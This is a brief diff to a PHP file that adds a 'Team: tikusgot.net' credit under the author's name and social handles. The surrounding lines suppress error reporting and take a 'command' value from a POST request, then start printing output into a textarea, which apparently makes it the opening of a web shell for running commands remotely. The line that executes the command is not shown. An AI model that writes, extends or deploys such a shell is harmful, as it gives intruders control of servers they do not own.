@@ -52,6 +52,7 @@
 //Author : Rommy Maulana
 //FB : fb.com/UndeathRommy
 //Github: github.com/rommymaul
+//Team: tikusgot.net
 error_reporting(0);
 $command = $_POST['command'];
 echo "<textarea>";
